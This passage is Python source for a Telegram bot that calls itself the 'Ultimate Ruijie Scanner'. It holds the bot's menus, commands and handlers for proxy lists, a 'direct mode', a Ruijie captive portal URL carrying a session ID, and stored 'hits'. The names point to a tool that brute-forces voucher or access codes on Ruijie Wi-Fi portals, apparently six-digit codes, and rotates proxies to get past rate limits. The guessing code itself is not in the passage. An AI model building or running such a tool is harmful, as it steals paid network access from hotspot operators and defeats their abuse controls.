    total, active = pm.stats()
    mode = ud.get("mode", context.user_data.get("selected_mode", "num6"))

    if data == "btn_toggle_direct":
        new_state = not pm.direct_enabled
        await pm.set_direct_enabled(new_state)
        state = "ON" if new_state else "OFF"
        warn = ("✅ Scan will work even without proxies." if new_state
                else "⚠️ Scan requires live proxies when OFF.")
        real_total, real_alive = pm.stats()
        portal = get_portal_url(user_id)
        text = (
            f"🔀 **Direct Mode: {state}**\n{warn}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
            f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_main_menu_markup())
        return

    if data == "btn_download_hits":
        await send_hits_file(update, context, user_id)
        return

    if data == "btn_clear_hits":
        count = await clear_user_hits(user_id)
        await query.edit_message_text(
            f"🗑 **HITS CLEARED**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Removed: `{count}` hits\n"
            f"✅ All hits deleted.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]
            ]))
        return

    if data == "btn_clear_proxies":
        old_count = await clear_all_proxies()
        await query.edit_message_text(
            f"🧹 **PROXIES CLEARED**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Removed: `{old_count}` proxies\n"
            f"✅ Proxy file is now empty.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]
            ]))
        return

    if data == "btn_back_main":
        context.user_data.pop("waiting_for_proxy", None)
        context.user_data.pop("waiting_for_portal", None)
        portal = get_portal_url(user_id)
        real_total, real_alive = pm.stats()
        text = (
            "⚡ **ULTIMATE SCANNER** ⚡\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
            f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
            f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_main_menu_markup())
        return

    if data == "btn_modes":
        await query.edit_message_text("📜 **SELECT MODE**", parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_mode_menu_markup())
        return

    if data.startswith("set_mode_"):
        new_mode = data.replace("set_mode_", "")
        context.user_data["selected_mode"] = new_mode
        if user_id in user_scanners:
            user_scanners[user_id]["mode"] = new_mode
        await query.edit_message_text(
            f"✅ Mode set to `{MODES.get(new_mode, new_mode)}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if data == "btn_portal":
        context.user_data["waiting_for_portal"] = True
        await query.edit_message_text(
            "🔮 **Send Portal URL**\n\n"
            "Format: `https://portal-as.ruijienetworks.com/...?sessionId=...`",
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "btn_add_proxies":
        context.user_data["waiting_for_proxy"] = True
        await query.edit_message_text(
            "🕷️ **Send Proxy List**\n\n"
            "Format: `ip:port` or `socks5://user:pass@ip:port`\n"
            "One per line.",
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "btn_status":
        real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
        text = (
            "👁️ **STATUS**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
            f"💀 Dead: `{dead_cnt}`\n"
            f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
            f"⚡ Workers: `{NUM_WORKERS}`\n"
            f"📦 Running: `{'Yes' if ud.get('running') else 'No'}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
        return

    if data == "btn_hits":
        hits = ud.get("hit_details", [])
        if not hits:
            await query.edit_message_text(
                "📦 **No hits yet.**", parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
            return
        lines = [f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}" for h in hits[-20:]]
        text = "📦 **MY HITS**\n" + "\n".join(lines)
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
        return

    if data == "btn_start":
        if not get_portal_url(user_id):
            await query.edit_message_text(
                "❌ **Portal URL not set!**\nUse 🔮 PORTAL first.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
            return
        await query.edit_message_text("⚡ Starting scanner...", parse_mode=ParseMode.MARKDOWN)
        asyncio.create_task(run_user_scanner(context, user_id))
        return

    if data == "stop_scan":
        if ud and not ud.get("stop_event", asyncio.Event()).is_set():
            ud["stop_event"].set()
            save_user_state(user_id, ud)
            await query.edit_message_text(
                "🛑 **STOPPED**\n💾 State saved.",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text("ℹ️ No active scan.", parse_mode=ParseMode.MARKDOWN)
        return

# ═══════════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = user_scanners.get(user_id, {})
    mode = ud.get("mode", "num6")
    portal = get_portal_url(user_id)
    pm = get_proxy_manager()
    real_total, real_alive = pm.stats()
    text = (
        "⚡ **ULTIMATE SCANNER** ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: `{user_id}`\n"
        f"📜 Mode: `{MODES.get(mode, mode)}`\n"
        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
        f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
        f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 Choose an option below:"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup())


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = user_scanners.get(user_id)
    if ud and not ud["stop_event"].is_set():
        ud["stop_event"].set()
        save_user_state(user_id, ud)
        await update.message.reply_text(
            "🛑 **STOPPED**\n"
            f"💾 Saved: `{ud['tried']:,}` tried | `{ud['hits']}` hits\n"
            "🔁 /start to resume anytime",
            parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("ℹ️ No active scan.")


async def direct_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pm = get_proxy_manager()
    new_state = not pm.direct_enabled
    await pm.set_direct_enabled(new_state)
    state = "ON" if new_state else "OFF"
    warn = ("✅ Scan will work even without proxies." if new_state
            else "⚠️ Scan requires live proxies when OFF.")
    await update.message.reply_text(
        f"🔀 **Direct Mode: {state}**\n{warn}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())


async def hits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await send_hits_file(update, context, user_id)


async def clearhits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = await clear_user_hits(user_id)
    await update.message.reply_text(
        f"🗑 **HITS CLEARED**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Removed: `{count}` hits",
        parse_mode=ParseMode.MARKDOWN)


async def clearproxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only")
        return
    old_count = await clear_all_proxies()
    await update.message.reply_text(
        f"🧹 **PROXIES CLEARED**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Removed: `{old_count}` proxies",
        parse_mode=ParseMode.MARKDOWN)


async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ No permission")
        return
    pm = get_proxy_manager()
    real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
    text = (
        "👑 **ADMIN PANEL**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users: `{len(user_scanners)}`\n"
        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
        f"💀 Dead: `{dead_cnt}`\n"
        f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
        f"⚡ Workers: `{NUM_WORKERS}`\n"
        f"📊 Active Scans: `{sum(1 for u in user_scanners.values() if u.get('running'))}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Use /purge to clean dead proxies"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def purge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ No permission")
        return
    pm = get_proxy_manager()
    removed = pm.purge_dead()
    real_total, real_alive = pm.stats()
    await update.message.reply_text(
        f"🧹 **PURGED**\n"
        f"Removed: `{removed}`\n"
        f"Remaining: `{real_alive}/{real_total}`",
        parse_mode=ParseMode.MARKDOWN)


# ═══════════════════════════════════════════════════════════════════
#  TEXT HANDLER
# ═══════════════════════════════════════════════════════════════════
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    pm = get_proxy_manager()

    if context.user_data.get("waiting_for_portal"):
        context.user_data.pop("waiting_for_portal")
        if not text.startswith("http"):
            await update.message.reply_text("❌ Invalid URL")
            return
        set_portal_url(user_id, text)
        if user_id in user_scanners:
            user_scanners[user_id]["portal_url"] = text
        await update.message.reply_text(
            "✅ **Portal URL saved!**\n⚡ Ready to scan.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if context.user_data.get("waiting_for_proxy"):
        context.user_data.pop("waiting_for_proxy")
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text("❌ Empty proxy list")
            return
        try:
            with open(PROXY_FILE, "w") as f:
                f.write("\n".join(lines) + "\n")
            pm.reload()
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
            return
        real_total, real_alive = pm.stats()
        await update.message.reply_text(
            f"✅ **Proxies Saved**\n"
            f"📊 Total: `{real_total}`\n"
            f"✅ Active: `{real_alive}`\n"
            f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    ud = user_scanners.get(user_id, {})
    mode = ud.get("mode", "num6")
    portal = get_portal_url(user_id)
    real_total, real_alive = pm.stats()
    msg = (
        "⚡ **ULTIMATE SCANNER** ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📜 Mode: `{MODES.get(mode, mode)}`\n"
        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
        f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
        f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup())


# ═══════════════════════════════════════════════════════════════════
#  ERROR HANDLER
# ═══════════════════════════════════════════════════════════════════
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    if err:
        traceback.print_exception(type(err), err, err.__traceback__)

# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    print("=" * 60)
    print("⚡ ULTIMATE RUIJIE SCANNER BOT (24/7 ACTIVE) ⚡")
    print("=" * 60)

    keep_alive()

    pm = get_proxy_manager()
    real_total, real_alive = pm.stats()
    print(f"[MAIN] Proxies: {real_alive}/{real_total}")
    print(f"[MAIN] Direct Mode: {'ON' if pm.direct_enabled else 'OFF'}")
    print(f"[MAIN] Workers: {NUM_WORKERS}")
    print(f"[MAIN] SID per: {MAX_CODES_PER_SID}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("direct", direct_cmd))
    app.add_handler(CommandHandler("hits", hits_cmd))
    app.add_handler(CommandHandler("clearhits", clearhits_cmd))
    app.add_handler(CommandHandler("clearproxies", clearproxies_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("purge", purge_cmd))

    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)

    print("[MAIN] Bot is running...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[MAIN] Stopped by user")
    except Exception as e:
        print(f"\n[FATAL] {type(e).__name__}: {e}")
        traceback.print_exc()
